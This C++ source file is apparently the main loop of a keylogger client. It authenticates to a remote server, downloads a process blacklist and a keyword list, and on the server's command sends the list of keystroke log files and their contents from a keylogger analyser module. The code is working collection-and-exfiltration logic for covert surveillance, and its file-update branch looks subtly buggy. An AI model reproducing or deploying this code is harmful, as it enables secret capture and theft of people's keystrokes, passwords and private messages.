
/* includes. */
#include "crypto/AESalgorithm.h"
#include "hashing/SHA256.h"
#include "client/client.h"
#include "client/task_request.h"
#include "dir_parser/DirectoryParser.h"
#include "config/ModuleConfigurer.h"

#include <fstream>
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <thread>
#include <chrono>

#define PROCESSES_FILE_NAME 	"black_list.txt"
#define WORDS_FILE_NAME			"words.txt"
#define REQUEST_BUF_SIZE		50
#define RESPONSE_BUF_SIZE		1024
#define SLEEP_DELAY				200
#define LOG_INTERVAL			33 /* 33 * (SLEEP_DELAY + WAIT_USEC) ~= 10000[ms] ~= 10[s] */

int main()
{
	ClientTCP* client = new ClientTCP(CLIENT_NAME, CLIENT_PASS, DEFAULT_ADDRESS, DEFAULT_PORT);
	ModuleConfigurer* mc = new ModuleConfigurer();
	DirectoryParser* logger = new DirectoryParser("../modules/keylogger/analyser/", "analyser"); /* path to char device file, char device name. */
	logger->UpdateLogFiles();

	char _buff[1024];
	memset(_buff, '\0', 1024);
	_buff[0] = '2'; _buff[1] = ':';
	int _len = logger->getLogList(_buff, 1024);
	std::cout << "len = " << _len << ". strlen = " << strlen(_buff) << std::endl;
	std::cout << _buff << std::endl;
	/* connect to server. */
	try
	{
		client->init();
	}
	catch(std::string err)
	{
		std::cout << err << std::endl;
	}
	try
	{
		client->connectToServer();
	}
	catch (std::string err)
	{
		std::cout << err << std::endl;
	}

	char reqest_msg[REQUEST_BUF_SIZE];
	uint8_t buff[RESPONSE_BUF_SIZE];
	int size, len;

	if (client->isConnected() == true)
	{
		/* authenticate to server. */
		bool authRes = client->authenticate();
		std::cout << "Authentication result: " << authRes << std::endl;
		/* send name to server. */
		if (authRes == true)
		{
			client->sendName((char*)buff, RESPONSE_BUF_SIZE);
		}
	}
	/* request process file */
	if (client->isConnected() == true)
	{
		memset(reqest_msg, '\0', REQUEST_BUF_SIZE);
		sprintf(reqest_msg, "%d:%s", TASK_SEND_FILE, PROCESSES_FILE_NAME);
		size = strlen(reqest_msg) + 1;
		client->sendToServer((uint8_t*)reqest_msg, size, true);
		len = client->receiveFromServer(buff, RESPONSE_BUF_SIZE, true);
		std::cout << buff << std::endl;

		/* update ps_parser hash table. */
		mc->UpdateTable(PROCESS_TABLE, (char*)buff);
		memset(buff, '\0', RESPONSE_BUF_SIZE);
		std::cout << "A primit tabelul de procese." << std::endl;
	}

	/* request word file from server. */
	if (client->isConnected() == true)
	{
		memset(reqest_msg, '\0', REQUEST_BUF_SIZE);
		sprintf(reqest_msg, "%d:%s", TASK_SEND_FILE, WORDS_FILE_NAME);
		size = strlen(reqest_msg) + 1;
		client->sendToServer((uint8_t*)reqest_msg, size, true);
		len = client->receiveFromServer(buff, RESPONSE_BUF_SIZE, true);
		/* update analiser hash tables. */
		mc->UpdateTable(WORDS_TABLE, (char*)buff);
		memset(buff, '\0', RESPONSE_BUF_SIZE);
		std::cout << "A primit tabelul de cuvinte." << std::endl;
	}

	/* LOOP */
	int result, log_cnt = 0;
	for (;;)
	{
		/* update log files. */
		if (log_cnt++ == LOG_INTERVAL)
		{
			logger->UpdateLogFiles();
			log_cnt = 0;
		}
		/* wait for command from server. */
		result = client->shortWaitCommand();
		if (result == -1) /* error. */
		{
			std::cout << "Select error!" << std::endl;
		}
		else if (result != 0) /* data available. */
		{
			/* receive from server. */
			len = client->receiveFromServer(buff, RESPONSE_BUF_SIZE, true);
			if (len == 0)
			{
				client->disconnectFromServer();
				continue;
			}
			/* resolve server request. */
			switch (buff[0] - '0')
			{
			case TASK_NEW_FILE:
				break;
			case TASK_GET_LOG_LIST:
				std::this_thread::sleep_for(std::chrono::milliseconds(SLEEP_DELAY));
				memset(buff, '\0', RESPONSE_BUF_SIZE);
				buff[0] = RESP_LOG_LIST;
				buff[1] = ':';
				len = logger->getLogList((char*)buff, RESPONSE_BUF_SIZE);
				//std::cout << "Trimite1" << std::endl;
				client->sendToServer(buff, (1 + len), true);
				std::this_thread::sleep_for(std::chrono::milliseconds(SLEEP_DELAY));
				sprintf((char*)buff, "%d:", RESP_LOG_LIST_END);
				//std::cout << "Trimite2" << std::endl;
				client->sendToServer(buff, 1 + strlen((char*)buff), true);
				break;
			case TASK_GET_LOG:
				logger->getLogFile(client, (char*)buff, RESPONSE_BUF_SIZE);
				break;
			case TASK_UPDATE_FILE:
				memset(reqest_msg, '\0', REQUEST_BUF_SIZE);
				sprintf(reqest_msg, "%d:%s", TASK_SEND_FILE, buff+2);
				size = strlen(reqest_msg) + 1;
				client->sendToServer((uint8_t*)reqest_msg, size, true);
				len = client->receiveFromServer(buff, RESPONSE_BUF_SIZE, true);

				/* update hash table. */
				if (strcmp((char*)buff+2, "black_list.txt"))
				{
					mc->UpdateTable(PROCESS_TABLE, (char*)buff+18);
					std::cout << "A primit tabelul de procese." << std::endl;
				}
				else
				{
					mc->UpdateTable(WORDS_TABLE, (char*)buff+13);
					std::cout << "A primit tabelul de cuvinte." << std::endl;
				}
				memset(buff, '\0', RESPONSE_BUF_SIZE);
				break;
			default:
				std::cout << "Unknown command: " << buff << std::endl;
				break;
			}
		}
		/* wait a little bit. */
		std::this_thread::sleep_for(std::chrono::milliseconds(SLEEP_DELAY));
	}
	/* delete resources. */
	delete client;
	delete mc;
	delete logger;
	return 0;
}
